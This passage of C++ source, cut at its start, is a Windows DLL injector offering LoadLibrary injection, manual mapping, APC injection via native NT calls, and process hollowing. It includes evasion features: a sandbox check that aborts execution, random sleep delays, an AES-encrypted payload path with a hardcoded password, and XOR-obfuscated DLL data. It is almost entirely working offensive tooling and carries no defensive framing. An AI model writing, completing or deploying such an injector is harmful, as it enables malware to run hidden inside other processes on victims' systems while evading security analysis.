            std::cerr << "[!] OpenProcess failed: " << utils::get_last_error_string() << std::endl;
            CloseHandle(hThread);
            return false;
        }

        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
        NtWriteVirtualMemory_t NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
        NtQueueApcThread_t NtQueueApcThread = (NtQueueApcThread_t)GetProcAddress(hNtdll, "NtQueueApcThread");

        LPVOID alloc = nullptr;
        SIZE_T size = dllPath.size() + 1;
        NTSTATUS status = NtAllocateVirtualMemory(hProcess, &alloc, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(status)) {
            std::cerr << "[!] NtAllocateVirtualMemory failed: 0x" << std::hex << status << std::endl;
            CloseHandle(hThread);
            CloseHandle(hProcess);
            return false;
        }

        SIZE_T bytesWritten;
        status = NtWriteVirtualMemory(hProcess, alloc, dllPath.c_str(), dllPath.size() + 1, &bytesWritten);
        if (!NT_SUCCESS(status)) {
            std::cerr << "[!] NtWriteVirtualMemory failed: 0x" << std::hex << status << std::endl;
            NtAllocateVirtualMemory(hProcess, &alloc, 0, &size, MEM_RELEASE, PAGE_NOACCESS);
            CloseHandle(hThread);
            CloseHandle(hProcess);
            return false;
        }

        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        LPVOID pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");

        status = NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)pLoadLibraryA, alloc, NULL, NULL);
        if (!NT_SUCCESS(status)) {
            std::cerr << "[!] NtQueueApcThread failed: 0x" << std::hex << status << std::endl;
            NtAllocateVirtualMemory(hProcess, &alloc, 0, &size, MEM_RELEASE, PAGE_NOACCESS);
            CloseHandle(hThread);
            CloseHandle(hProcess);
            return false;
        }

        CloseHandle(hThread);
        CloseHandle(hProcess);
        return true;
    }

    bool inject_via_hollowing(const std::string& targetPath, const std::string& payloadPath) {
        return process::hollow_process(targetPath, payloadPath);
    }
}

// ------------------------ MAIN FUNCTIONALITY ------------------------ //
bool perform_injection(DWORD pid, const std::vector<BYTE>& encryptedDllPath, const std::string& password) {
    if (sandbox::is_sandbox()) {
        std::cerr << "[!] Sandbox detected. Aborting.\n";
        return false;
    }

    utils::random_sleep(1000, 3000);

    std::vector<BYTE> decrypted;
    if (!crypto::aes_decrypt(encryptedDllPath, decrypted, password)) {
        std::cerr << "[!] AES decryption failed.\n";
        return false;
    }

    std::string dllPath(reinterpret_cast<char*>(decrypted.data()));
    std::cout << "[*] Decrypted DLL path: " << dllPath << std::endl;

    if (!process::is_process_running(pid)) {
        std::cerr << "[!] Target process not running\n";
        return false;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[!] OpenProcess failed: " << utils::get_last_error_string() << std::endl;
        return false;
    }

    HANDLE hFile = CreateFileA(dllPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[!] Failed to open DLL file: " << utils::get_last_error_string() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    std::vector<BYTE> dllData(fileSize);
    DWORD bytesRead;
    if (!ReadFile(hFile, dllData.data(), fileSize, &bytesRead, NULL)) {
        std::cerr << "[!] Failed to read DLL file: " << utils::get_last_error_string() << std::endl;
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return false;
    }
    CloseHandle(hFile);

    crypto::xor_crypt(dllData, password);

    bool success = false;
    std::cout << "1. LoadLibrary injection\n";
    std::cout << "2. Manual mapping\n";
    std::cout << "3. APC injection\n";
    std::cout << "4. Process hollowing\n";
    std::cout << "Choose method: ";
    
    int method;
    std::cin >> method;
    std::cin.ignore();

    switch (method) {
        case 1:
            success = injection::inject_via_loadlibrary(hProcess, dllPath);
            break;
        case 2:
            success = injection::inject_via_manual_map(hProcess, dllData);
            break;
        case 3:
            success = injection::inject_via_apc(pid, dllPath);
            break;
        case 4: {
            std::string targetPath;
            std::cout << "Enter path to legitimate process to hollow: ";
            std::getline(std::cin, targetPath);
            success = injection::inject_via_hollowing(targetPath, dllPath);
            break;
        }
        default:
            std::cerr << "[!] Invalid method selected\n";
            break;
    }

    CloseHandle(hProcess);
    return success;
}

int main() {
    std::cout << R"(
   ____  _      _____ _____ _   _ ____  _____ ____  
  |  _ \| |    |_   _| ____| \ | |  _ \| ____|  _ \ 
  | | | | |      | | |  _| |  \| | | | |  _| | |_) |
  | |_| | |___   | | | |___| |\  | |_| | |___|  _ < 
  |____/|_____|  |_| |_____|_| \_|____/|_____|_| \_\
)" << std::endl;

    if (!utils::is_elevated()) {
        std::cerr << "[!] Warning: Not running with administrator privileges\n";
    }

    if (!utils::set_debug_privilege()) {
        std::cerr << "[!] Warning: Failed to set debug privilege\n";
    }

    std::string password = "supersecret";
    std::vector<BYTE> encryptedDllPath = {
        0x2A, 0x73, 0x8F, 0x44, 0x19, 0xC1, 0x5E, 0xD4,
        0x01, 0x2B, 0x43, 0x98, 0xA3, 0xFA, 0x00, 0x11
    }; // Replace with real encrypted bytes

    while (true) {
        std::cout << "\n1. Enter PID manually\n";
        std::cout << "2. Find PID by process name\n";
        std::cout << "3. Exit\n";
        std::cout << "Choose option: ";

        int choice;
        std::cin >> choice;
        std::cin.ignore();

        if (choice == 3) break;

        DWORD targetPid = 0;
        if (choice == 1) {
            std::cout << "Enter PID to inject: ";
            std::cin >> targetPid;
            std::cin.ignore();
        }
        else if (choice == 2) {
            std::string processName;
            std::cout << "Enter process name (e.g., notepad.exe): ";
            std::getline(std::cin, processName);
            
            targetPid = process::find_pid(processName);
            if (!targetPid) {
                std::cerr << "[!] Process not found\n";
                continue;
            }
            std::cout << "[*] Found PID: " << targetPid << std::endl;
        }
        else {
            std::cerr << "[!] Invalid choice\n";
            continue;
        }

        if (perform_injection(targetPid, encryptedDllPath, password)) {
            std::cout << "[+] Injection succeeded!\n";
        }
        else {
            std::cerr << "[!] Injection failed.\n";
        }
    }

    return 0;
}